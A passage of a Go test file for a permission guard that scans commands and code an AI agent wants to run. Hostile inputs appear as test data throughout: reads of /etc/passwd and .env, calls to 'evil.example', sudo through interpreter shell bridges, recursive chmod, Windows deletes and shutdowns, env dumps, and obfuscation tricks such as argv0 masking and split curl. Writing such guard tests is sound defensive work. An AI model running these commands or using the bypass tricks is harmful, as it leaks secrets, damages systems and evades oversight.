		code string
		rule string
	}{
		{
			name: "denied path",
			code: `print(open('/etc/passwd').read())`,
			rule: "sensitive.path_access",
		},
		{
			name: "non-allowlisted network",
			code: `socket.create_connection(('evil.example', 443))`,
			rule: "network.non_whitelisted_domain",
		},
	} {
		t.Run(tt.name, func(t *testing.T) {
			args, err := json.Marshal(map[string]any{
				"code_blocks": []map[string]string{{
					"language": "python",
					"code":     tt.code,
				}},
			})
			if err != nil {
				t.Fatal(err)
			}
			decision, err := guard.CheckToolPermission(
				context.Background(),
				&tool.PermissionRequest{
					Tool:        execTool,
					ToolName:    "python_runner",
					Declaration: execTool.Declaration(),
					Arguments:   args,
				},
			)
			if err != nil {
				t.Fatal(err)
			}
			if decision.Action != tool.PermissionActionDeny ||
				!strings.Contains(decision.Reason, tt.rule) {
				t.Fatalf("renamed codeexec bypassed %s: %+v", tt.rule, decision)
			}
		})
	}
}

func TestPermissionPolicyUsesCodeExecutorTimeout(t *testing.T) {
	args := []byte(`{"code_blocks":[{"language":"python","code":"print(1)"}]}`)
	for _, tt := range []struct {
		name    string
		timeout time.Duration
		bounded bool
		rule    string
	}{
		{
			name:    "timeout exceeds policy",
			timeout: 45 * time.Second,
			bounded: true,
			rule:    "resource.timeout_exceeded",
		},
		{
			name:    "unbounded timeout",
			bounded: false,
			rule:    "resource.unbounded_timeout",
		},
	} {
		t.Run(tt.name, func(t *testing.T) {
			execTool := codeexectool.NewTool(&permissionCodeExecutor{
				timeout: tt.timeout,
				bounded: tt.bounded,
			})
			policy := DefaultPolicy()
			policy.MaxTimeoutSeconds = 30
			decision, err := NewPermissionPolicy(policy).CheckToolPermission(
				context.Background(),
				&tool.PermissionRequest{
					Tool:        execTool,
					ToolName:    "execute_code",
					Declaration: execTool.Declaration(),
					Arguments:   args,
				},
			)
			if err != nil {
				t.Fatal(err)
			}
			if decision.Action != tool.PermissionActionDeny ||
				!strings.Contains(decision.Reason, tt.rule) {
				t.Fatalf("code executor timeout bypassed %s: %+v", tt.rule, decision)
			}
		})
	}
}

func TestPermissionPolicyValidatesDeclaredCustomOutputCap(t *testing.T) {
	policyConfig := DefaultPolicy()
	policyConfig.MaxOutputBytes = 1024
	policy := NewPermissionPolicy(
		policyConfig,
		WithPermissionRequestParser(
			"custom_exec",
			func(req *tool.PermissionRequest) (Request, bool, error) {
				return Request{
					ToolName:       req.ToolName,
					Backend:        "custom",
					Command:        "go test ./...",
					MaxOutputBytes: 2048,
				}, true, nil
			},
		),
	)
	decision, err := policy.CheckToolPermission(
		context.Background(),
		&tool.PermissionRequest{ToolName: "custom_exec"},
	)
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny ||
		!strings.Contains(decision.Reason, "resource.output_limit_exceeded") {
		t.Fatalf("declared custom output cap should be validated: %+v", decision)
	}
}

func TestPermissionPolicyUsesExtensionRequestParser(t *testing.T) {
	parserCalled := false
	policy := NewPermissionPolicy(
		DefaultPolicy(),
		WithPermissionRequestParser(
			"mcp_shell",
			func(req *tool.PermissionRequest) (Request, bool, error) {
				parserCalled = true
				return Request{
					ToolName: req.ToolName,
					Backend:  "mcp",
					Command:  "cat .env",
				}, true, nil
			},
		),
	)
	decision, err := policy.CheckToolPermission(
		context.Background(),
		&tool.PermissionRequest{ToolName: "mcp_shell"},
	)
	if err != nil {
		t.Fatal(err)
	}
	if !parserCalled || decision.Action != tool.PermissionActionDeny {
		t.Fatalf("parserCalled = %v, decision = %+v", parserCalled, decision)
	}
}

func TestPermissionPolicyHandlesUnknownTool(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), nil)
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("nil request action = %q, want allow", decision.Action)
	}

	decision, err = policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "unknown_tool",
		Arguments: []byte(`{}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAsk ||
		!strings.Contains(decision.Reason, "unknown_tool") {
		t.Fatalf("unknown tool decision = %+v, want ask", decision)
	}

	for _, tc := range []struct {
		name   string
		action tool.PermissionAction
		want   tool.PermissionAction
	}{
		{name: "allow", action: tool.PermissionActionAllow, want: tool.PermissionActionAllow},
		{name: "deny", action: tool.PermissionActionDeny, want: tool.PermissionActionDeny},
		{name: "invalid fails closed", action: "execute", want: tool.PermissionActionDeny},
	} {
		t.Run(tc.name, func(t *testing.T) {
			config := DefaultPolicy()
			config.UnknownToolAction = tc.action
			guard := NewPermissionPolicy(config)
			got, err := guard.CheckToolPermission(
				context.Background(),
				&tool.PermissionRequest{ToolName: "unknown_tool"},
			)
			if err != nil {
				t.Fatal(err)
			}
			if got.Action != tc.want {
				t.Fatalf("action = %q, want %q: %+v", got.Action, tc.want, got)
			}
		})
	}
}

func TestPermissionPolicyHonorsCanceledContext(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	decision, err := NewPermissionPolicy(DefaultPolicy()).CheckToolPermission(
		ctx,
		&tool.PermissionRequest{
			ToolName:  "workspace_exec",
			Arguments: []byte(`{"command":"go test ./..."}`),
		},
	)
	if !errors.Is(err, context.Canceled) {
		t.Fatalf("error = %v, want context.Canceled", err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("action = %q, want deny", decision.Action)
	}
}

func TestPermissionPolicyScansInlineInterpreterPayloads(t *testing.T) {
	guard := NewPermissionPolicy(DefaultPolicy())
	for _, tc := range []struct {
		name    string
		command string
		want    tool.PermissionAction
		ruleID  string
	}{
		{
			name:    "python network",
			command: `python -c "import socket; socket.create_connection(('evil.example',443))"`,
			want:    tool.PermissionActionDeny,
			ruleID:  "network.non_whitelisted_domain",
		},
		{
			name:    "python shell bridge",
			command: `python -c "import os; os.system('sudo id')"`,
			want:    tool.PermissionActionAsk,
			ruleID:  "codeexec.host_command_bridge",
		},
		{
			name:    "node shell bridge",
			command: `node -e "require('child_process').execSync('sudo id')"`,
			want:    tool.PermissionActionAsk,
			ruleID:  "codeexec.host_command_bridge",
		},
		{
			name:    "node attached long option",
			command: `node --eval="require('child_process').execSync('sudo id')"`,
			want:    tool.PermissionActionAsk,
			ruleID:  "codeexec.host_command_bridge",
		},
		{
			name:    "ruby shell bridge",
			command: `ruby -e "system('sudo id')"`,
			want:    tool.PermissionActionAsk,
			ruleID:  "codeexec.host_command_bridge",
		},
		{
			name:    "ruby attached short option",
			command: `ruby -e"system('sudo id')"`,
			want:    tool.PermissionActionAsk,
			ruleID:  "codeexec.host_command_bridge",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			args, err := json.Marshal(map[string]any{"command": tc.command})
			if err != nil {
				t.Fatal(err)
			}
			decision, err := guard.CheckToolPermission(
				context.Background(),
				&tool.PermissionRequest{
					ToolName:  "workspace_exec",
					Arguments: args,
				},
			)
			if err != nil {
				t.Fatal(err)
			}
			if decision.Action != tc.want ||
				!strings.Contains(decision.Reason, tc.ruleID) {
				t.Fatalf("unexpected decision: %+v", decision)
			}
		})
	}
}

func TestPermissionPolicyInvalidArgsDeny(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny ||
		!strings.Contains(decision.Reason, "invalid args") {
		t.Fatalf("unexpected decision: %+v", decision)
	}
}

func TestPermissionPolicyAuditPath(t *testing.T) {
	path := filepath.Join(t.TempDir(), "audit.jsonl")
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditPath(path))
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"cat .env"}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("action = %q, want deny", decision.Action)
	}
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var event AuditEvent
	if err := json.Unmarshal(bytes.TrimSpace(b), &event); err != nil {
		t.Fatalf("audit file was not json: %v\n%s", err, string(b))
	}
	if event.RuleID != "sensitive.path_access" {
		t.Fatalf("unexpected audit event: %+v", event)
	}
}

func TestPermissionPolicyAuditWriterError(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditWriter(errorWriter{}))
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./..."}`),
	})
	if err == nil {
		t.Fatal("CheckToolPermission audit writer error = nil")
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("audit writer error action = %q, want deny", decision.Action)
	}
}

func TestPermissionPolicyConcurrentAuditWritesCompleteJSONL(t *testing.T) {
	const requestCount = 64

	var audit bytes.Buffer
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditWriter(&audit))
	start := make(chan struct{})
	results := make(chan struct {
		decision tool.PermissionDecision
		err      error
	}, requestCount)
	var wg sync.WaitGroup
	for i := 0; i < requestCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			<-start
			decision, err := policy.CheckToolPermission(
				context.Background(),
				&tool.PermissionRequest{
					ToolName:  "workspace_exec",
					Arguments: []byte(`{"command":"go test ./..."}`),
				},
			)
			results <- struct {
				decision tool.PermissionDecision
				err      error
			}{decision: decision, err: err}
		}()
	}
	close(start)
	wg.Wait()
	close(results)

	for result := range results {
		if result.err != nil {
			t.Fatalf("CheckToolPermission() error = %v", result.err)
		}
		if result.decision.Action != tool.PermissionActionAllow {
			t.Fatalf("action = %q, want allow", result.decision.Action)
		}
	}

	lines := bytes.Split(bytes.TrimSpace(audit.Bytes()), []byte{'\n'})
	if len(lines) != requestCount {
		t.Fatalf("audit lines = %d, want %d", len(lines), requestCount)
	}
	for i, line := range lines {
		var event AuditEvent
		if err := json.Unmarshal(line, &event); err != nil {
			t.Fatalf("audit line %d was not complete JSON: %v\n%s", i, err, line)
		}
		if event.ToolName != "workspace_exec" || event.Decision != DecisionAllow {
			t.Fatalf("unexpected audit event on line %d: %+v", i, event)
		}
	}
}

func TestNilPermissionPolicyFailsClosed(t *testing.T) {
	var policy *PermissionPolicy
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./..."}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("action = %q, want deny", decision.Action)
	}
}

func TestPermissionPolicyAllowsNullCodeBlocksNoop(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "execute_code",
		Arguments: []byte(`{"code_blocks":null}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("action = %q, want allow", decision.Action)
	}
}

func TestPermissionPolicyAllowsCodeExecBlocksAndDeniesBadBlocks(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "execute_code",
		Arguments: []byte(`{"code_blocks":[{"language":"python","code":"print(1)"}]}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("valid code block action = %q, want allow", decision.Action)
	}

	decision, err = policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "execute_code",
		Arguments: []byte(`{"code_blocks":42}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny ||
		!strings.Contains(decision.Reason, "code_blocks") {
		t.Fatalf("bad code block decision = %+v, want deny with code_blocks reason", decision)
	}
}

func TestRequestFromPermissionRequestParsesExecMetadata(t *testing.T) {
	req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
		ToolName: "exec_command",
		Arguments: []byte(`{
			"command":"go test ./...",
			"workdir":"/tmp/work",
			"env":{"PATH":"/bin"},
			"background":true,
			"timeoutSec":12,
			"pty":true
		}`),
		Metadata: tool.ToolMetadata{Destructive: true},
	})
	if err != nil {
		t.Fatal(err)
	}
	if !ok || req.Backend != BackendHostExec || req.Cwd != "/tmp/work" ||
		req.TimeoutSeconds != 12 || !req.Background || !req.TTY ||
		!req.Metadata.Destructive || req.Env["PATH"] != "/bin" {
		t.Fatalf("unexpected request: %+v", req)
	}
}

func TestBuiltInPermissionRequestsDoNotClaimOutputByteCap(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{name: "workspace_exec", args: `{"command":"go test ./..."}`},
		{name: "exec_command", args: `{"command":"go test ./..."}`},
		{
			name: "execute_code",
			args: `{"code_blocks":[{"language":"python","code":"print(1)"}]}`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
				ToolName:  tt.name,
				Arguments: []byte(tt.args),
			})
			if err != nil {
				t.Fatal(err)
			}
			if !ok {
				t.Fatal("RequestFromPermissionRequest() ok = false")
			}
			if req.MaxOutputBytes != 0 {
				t.Fatalf("built-in request output cap = %d, want undeclared", req.MaxOutputBytes)
			}
		})
	}
}

func TestRequestFromPermissionRequestParsesTTYAndTimeoutSec(t *testing.T) {
	req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
		ToolName: "workspace_exec",
		Arguments: []byte(`{
			"command":"go test ./...",
			"cwd":".",
			"timeout_sec":7,
			"tty":true
		}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if !ok || req.Backend != BackendWorkspaceExec || req.Cwd != "." ||
		req.TimeoutSeconds != 7 || !req.TTY {
		t.Fatalf("unexpected request: %+v ok=%v", req, ok)
	}
}

func TestRequestFromPermissionRequestUsesDeclarationName(t *testing.T) {
	req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
		Declaration: &tool.Declaration{Name: "workspace_exec"},
		Arguments:   []byte(`{"command":"go test ./...","cwd":"."}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if !ok || req.ToolName != "workspace_exec" || req.Command != "go test ./..." ||
		req.Cwd != "." || req.Backend != BackendWorkspaceExec {
		t.Fatalf("unexpected request: %+v ok=%v", req, ok)
	}
}

func TestParseCodeBlocksVariants(t *testing.T) {
	blocks, err := parseCodeBlocks(json.RawMessage(`{"language":"python","code":"print(1)"}`))
	if err != nil {
		t.Fatal(err)
	}
	if len(blocks) != 1 || blocks[0].Language != "python" {
		t.Fatalf("unexpected object blocks: %+v", blocks)
	}

	inner := `[{"language":"bash","code":"echo ok"}]`
	blocks, err = parseCodeBlocks(json.RawMessage(strconvQuote(inner)))
	if err != nil {
		t.Fatal(err)
	}
	if len(blocks) != 1 || blocks[0].Language != "bash" {
		t.Fatalf("unexpected string blocks: %+v", blocks)
	}

	if _, err := parseCodeBlocks(json.RawMessage(`"not-json"`)); err == nil {
		t.Fatal("parseCodeBlocks invalid string error = nil")
	}
	if _, err := parseCodeBlocks(json.RawMessage(`42`)); err == nil {
		t.Fatal("parseCodeBlocks scalar error = nil")
	}
	if _, err := parseCodeBlocks(json.RawMessage(`[{"language":42}]`)); err == nil {
		t.Fatal("parseCodeBlocks malformed array error = nil")
	}
}

func TestScanRedactsSecrets(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "echo OPENAI_API_KEY=sk-1234567890abcdef",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny", report.Decision)
	}
	if !report.Redacted {
		t.Fatalf("report should indicate redaction")
	}
	raw, _ := json.Marshal(report)
	if bytes.Contains(raw, []byte("sk-1234567890abcdef")) {
		t.Fatalf("report leaked secret: %s", raw)
	}
}

func TestScanRedactsSplitSecretArguments(t *testing.T) {
	for _, command := range []string{
		"client --api-key hunter2",
		"client --token opaque-value",
	} {
		report := Scan(Request{
			ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
			Command: command,
		}, DefaultPolicy())
		if report.Decision != DecisionDeny || !report.Redacted {
			t.Fatalf("split secret should be denied and redacted: %+v", report)
		}
		raw, err := json.Marshal(report)
		if err != nil {
			t.Fatal(err)
		}
		if bytes.Contains(raw, []byte("hunter2")) || bytes.Contains(raw, []byte("opaque-value")) {
			t.Fatalf("serialized report leaked secret: %s", raw)
		}
	}
}

func TestScanMetadataEnvAndTelemetry(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go test ./...",
		Metadata: ToolMetadata{Destructive: true},
		Env: map[string]string{
			// LANG is allowlisted and does not resolve executables, so this
			// case isolates the metadata and allowlist rules. Execution
			// resolving variables are covered by
			// TestScanExecutionResolvingEnvOverrides.
			"LANG":    "C",
			"BAD_ENV": "1",
		},
	}, DefaultPolicy())
	if report.Decision != DecisionNeedsHumanReview ||
		report.RuleID != "tool.metadata_destructive" {
		t.Fatalf("unexpected report: %+v", report)
	}
	attrs := report.SpanAttributes()
	if attrs["tool.safety.decision"] != string(report.Decision) ||
		attrs["tool.safety.risk_level"] != string(report.RiskLevel) ||
		attrs["tool.safety.rule_id"] != report.RuleID ||
		attrs["tool.safety.backend"] != report.Backend {
		t.Fatalf("unexpected span attrs: %+v", attrs)
	}
	if len(report.Findings) < 2 {
		t.Fatalf("expected metadata and env findings: %+v", report.Findings)
	}
}

func TestValidateReportMissingFields(t *testing.T) {
	tests := []struct {
		name   string
		report Report
		want   string
	}{
		{
			name:   "decision",
			report: Report{},
			want:   "missing decision",
		},
		{
			name:   "risk",
			report: Report{Decision: DecisionAllow},
			want:   "missing risk_level",
		},
		{
			name: "rule",
			report: Report{
				Decision:       DecisionDeny,
				RiskLevel:      RiskHigh,
				Recommendation: "fix it",
			},
			want: "missing rule_id",
		},
		{
			name: "evidence",
			report: Report{
				Decision:       DecisionDeny,
				RiskLevel:      RiskHigh,
				RuleID:         "rule",
				Recommendation: "fix it",
			},
			want: "missing evidence",
		},
		{
			name: "recommendation",
			report: Report{
				Decision:  DecisionAllow,
				RiskLevel: RiskLow,
			},
			want: "missing recommendation",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateReport(tt.report)
			if err == nil || !strings.Contains(err.Error(), tt.want) {
				t.Fatalf("ValidateReport() error = %v, want %q", err, tt.want)
			}
		})
	}
}

func TestScanDeniedCWD(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "ls",
		Cwd:      "~/.ssh",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny || report.RuleID != "sensitive.cwd_access" {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func TestScanDeniedRootPath(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go test ./...",
		Cwd:      "/",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny || report.RuleID != "sensitive.cwd_access" {
		t.Fatalf("root cwd should be denied: %+v", report)
	}

	report = Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat /",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny || report.RuleID != "sensitive.path_access" {
		t.Fatalf("root path argument should be denied: %+v", report)
	}
}

func TestScanAdditionalRuleBranches(t *testing.T) {
	tests := []struct {
		name   string
		cmd    string
		ruleID string
	}{
		{
			name:   "recursive chmod",
			cmd:    "chmod -R 777 .",
			ruleID: "dangerous.recursive_chmod",
		},
		{
			name:   "recursive chmod clustered option",
			cmd:    "chmod -Rv 777 .",
			ruleID: "dangerous.recursive_chmod",
		},
		{
			name:   "recursive chmod long option",
			cmd:    "chmod --recursive 777 .",
			ruleID: "dangerous.recursive_chmod",
		},
		{
			name:   "network command without target",
			cmd:    "curl --head",
			ruleID: "network.unresolved_target",
		},
		{
			name:   "python large output",
			cmd:    "python -c 'print(\"x\" * 9999999)'",
			ruleID: "resource.large_output",
		},
		{
			name:   "parallel high concurrency",
			cmd:    "parallel -j 64 echo ::: a b c",
			ruleID: "resource.high_concurrency",
		},
		{
			name:   "infinite loop",
			cmd:    "for ;; do echo x; done",
			ruleID: "resource.infinite_loop",
		},
		{
			name:   "windows system path delete",
			cmd:    "rm -r C:/Windows",
			ruleID: "dangerous.rm_rf",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  tt.cmd,
			}, DefaultPolicy())
			if report.RuleID != tt.ruleID {
				t.Fatalf("rule id = %q, want %q; report: %+v",
					report.RuleID, tt.ruleID, report)
			}
		})
	}
}

func TestScanClosesNewCommandAndPathBypasses(t *testing.T) {
	tests := []struct {
		name   string
		req    Request
		ruleID string
	}{
		{
			name: "windows cmd expansion",
			req: Request{ToolName: "exec_command", Backend: BackendHostExec,
				Command: `%COMSPEC% /c shutdown /s /t 0`, TimeoutSeconds: 300},
			ruleID: "shell.windows_cmd_syntax",
		},
		{
			name: "windows start builtin",
			req: Request{ToolName: "exec_command", Backend: BackendHostExec,
				Command: `start "" shutdown /s /t 0`, TimeoutSeconds: 300},
			ruleID: "shell.windows_cmd_builtin",
		},
		{
			name: "windows call builtin",
			req: Request{ToolName: "exec_command", Backend: BackendHostExec,
				Command: `call shutdown /s /t 0`, TimeoutSeconds: 300},
			ruleID: "shell.windows_cmd_builtin",
		},
		{
			name: "deferred trap builtin",
			req: Request{ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
				Command: `trap 'sudo id' EXIT`, TimeoutSeconds: 300},
			ruleID: "shell.intrinsic_unsafe_command",
		},
		{
			name: "windows cwd",
			req: Request{ToolName: "exec_command", Backend: BackendHostExec,
				Command: "dir", Cwd: `C:\Windows`, TimeoutSeconds: 300},
			ruleID: "sensitive.cwd_access",
		},
		{
			name: "windows file read",
			req: Request{ToolName: "exec_command", Backend: BackendHostExec,
				Command: `type 'C:\Windows\System32\drivers\etc\hosts'`, TimeoutSeconds: 300},
			ruleID: "sensitive.path_access",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(tt.req, DefaultPolicy())
			if report.Decision == DecisionAllow || !reportHasRule(report, tt.ruleID) {
				t.Fatalf("expected %s: %+v", tt.ruleID, report)
			}
		})
	}
}

func TestScanEnvironmentDumpCommandsNeverAllow(t *testing.T) {
	for _, command := range []string{"env", "printenv", "set"} {
		report := Scan(Request{
			ToolName: "exec_command", Backend: BackendHostExec,
			Command: command, TimeoutSeconds: 300,
		}, DefaultPolicy())
		if report.Decision == DecisionAllow ||
			!reportHasRule(report, "sensitive.inherited_environment") {
			t.Fatalf("environment dump %q should not be allowed: %+v", command, report)
		}
	}
}

func TestScanEnvArgv0CannotHideEffectiveCommand(t *testing.T) {
	tests := []struct {
		command string
		ruleID  string
	}{
		{command: "env -a marker sudo id", ruleID: "policy.denied_command"},
		{command: "env --argv0 marker curl evil.example", ruleID: "network.non_whitelisted_domain"},
		{command: "env -a marker curl evil.example", ruleID: "network.non_whitelisted_domain"},
		{command: "env --unknown marker sudo id", ruleID: "shell.intrinsic_unsafe_command"},
	}
	for _, tt := range tests {
		report := Scan(Request{
			ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
			Command: tt.command, TimeoutSeconds: 300,
		}, DefaultPolicy())
		if report.Decision == DecisionAllow || !reportHasRule(report, tt.ruleID) {
			t.Fatalf("env command bypassed %s: %+v", tt.ruleID, report)
		}
	}
}

func TestScanDetectsCommandAcrossLineContinuation(t *testing.T) {
	report := Scan(Request{
		ToolName: "execute_code", Backend: BackendCodeExec,
		CodeBlocks: []CodeBlock{{Language: "bash", Code: "cu\\\nrl evil.example"}},
	}, DefaultPolicy())
	if report.Decision != DecisionDeny ||
		!reportHasRule(report, "network.non_whitelisted_domain") {
		t.Fatalf("continued curl should be denied: %+v", report)
	}
}

func TestScanReviewCommandsNormalizesExecutable(t *testing.T) {
	for _, command := range []string{
		"/usr/bin/npm install left-pad",
		"env npm install left-pad",
	} {
		report := Scan(Request{
			ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
			Command: command, TimeoutSeconds: 300,
		}, DefaultPolicy())
		if report.Decision != DecisionNeedsHumanReview ||
			!reportHasRule(report, "dependency.environment_change") {
			t.Fatalf("installer should require review: %+v", report)
		}
	}
}

func TestScanCodeExecAppliesRequestEnvelope(t *testing.T) {
	tests := []struct {
		name     string
		req      Request
		decision Decision
		ruleID   string
	}{
		{
			name: "denied cwd",
			req: Request{
				ToolName: "execute_code",
				Backend:  BackendCodeExec,
				Cwd:      "/",
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "print(1)",
				}},
			},
			decision: DecisionDeny,
			ruleID:   "sensitive.cwd_access",
		},
		{
			name: "timeout exceeded",
			req: Request{
				ToolName:       "execute_code",
				Backend:        BackendCodeExec,
				TimeoutSeconds: DefaultPolicy().MaxTimeoutSeconds + 1,
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "print(1)",
				}},
			},
			decision: DecisionDeny,
			ruleID:   "resource.timeout_exceeded",
		},
		{
			name: "output exceeded",
			req: Request{
				ToolName:       "execute_code",
				Backend:        BackendCodeExec,
				MaxOutputBytes: DefaultPolicy().MaxOutputBytes + 1,
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "print(1)",
				}},
			},
			decision: DecisionDeny,
			ruleID:   "resource.output_limit_exceeded",
		},
		{
			name: "background",
			req: Request{
				ToolName:   "execute_code",
				Backend:    BackendCodeExec,
				Background: true,
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "print(1)",
				}},
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "process.background",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(tt.req, DefaultPolicy())
			if report.Decision != tt.decision || report.RuleID != tt.ruleID {
				t.Fatalf("unexpected report: %+v", report)
			}
		})
	}
}

func TestScanCodeExecShellAndNonShellBranches(t *testing.T) {
	report := Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "bash",
			Code:     "go test ./...",
		}},
	}, DefaultPolicy())
	if report.Decision != DecisionAllow {
		t.Fatalf("bash code block should be allowed: %+v", report)
	}

	report = Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "python",
			Code:     "import urllib.request; urllib.request.urlopen('https://evil.example')",
		}},
	}, DefaultPolicy())
	if report.Decision != DecisionDeny ||
		report.RuleID != "network.non_whitelisted_domain" {
		t.Fatalf("python network code block should be denied: %+v", report)
	}
}

func TestScanHighConcurrencyNeedsReview(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "parallel -j 64 echo ::: a b c",
	}, DefaultPolicy())
	if report.Decision != DecisionNeedsHumanReview ||
		report.RuleID != "resource.high_concurrency" {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func TestCommandNameStripsExecutableSuffixCaseInsensitively(t *testing.T) {
	tests := map[string]string{
		"DD.EXE":        "dd",
		"Curl.ExE":      "curl",
		"SCRIPT.CMD":    "script",
		"Tool.BaT":      "tool",
		"utility.CoM":   "utility",
		`C:\Bin\DD.EXE`: "dd",
	}
	for input, want := range tests {
		if got := commandName(input); got != want {
			t.Fatalf("commandName(%q) = %q, want %q", input, got, want)
		}
	}
}

func TestScanFiveHundredCommands(t *testing.T) {
	command := strings.Repeat("go test ./...\n", 500)
	report := Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "python",
			Code:     command,
		}},
	}, DefaultPolicy())
	if report.Decision != DecisionAllow {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func BenchmarkScanFiveHundredCommands(b *testing.B) {
	command := strings.Repeat("go test ./...\n", 500)
	req := Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "python",
			Code:     command,
		}},
	}
	policy := DefaultPolicy()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		Scan(req, policy)
	}
}

func TestAuditHelpersHandleNoopAndErrors(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go test ./...",
	}, DefaultPolicy())
	if err := WriteAuditJSONL(nil, report); err != nil {
		t.Fatalf("WriteAuditJSONL(nil) error = %v", err)
	}
	if err := AppendAuditFile("", report); err != nil {
		t.Fatalf("AppendAuditFile(empty) error = %v", err)
	}
	missingParent := filepath.Join(t.TempDir(), "missing", "audit.jsonl")
	if err := AppendAuditFile(missingParent, report); err == nil {
		t.Fatal("AppendAuditFile missing parent error = nil")
	}
}

func TestPermissionReasonWithoutEvidence(t *testing.T) {
	reason := permissionReason(Report{
		Decision:       DecisionDeny,
		Recommendation: "provide a command",
	})
	if !strings.Contains(reason, "tool safety guard deny") ||
		!strings.Contains(reason, "provide a command") {
		t.Fatalf("unexpected reason: %q", reason)
	}
}

func TestContainsPipelineIgnoresQuotedSeparators(t *testing.T) {
	if containsPipeline(`echo "a|b"`) {
		t.Fatal("double-quoted pipe should not count as pipeline")
	}
	if containsPipeline(`echo 'a;b'`) {
		t.Fatal("single-quoted semicolon should not count as pipeline")
	}
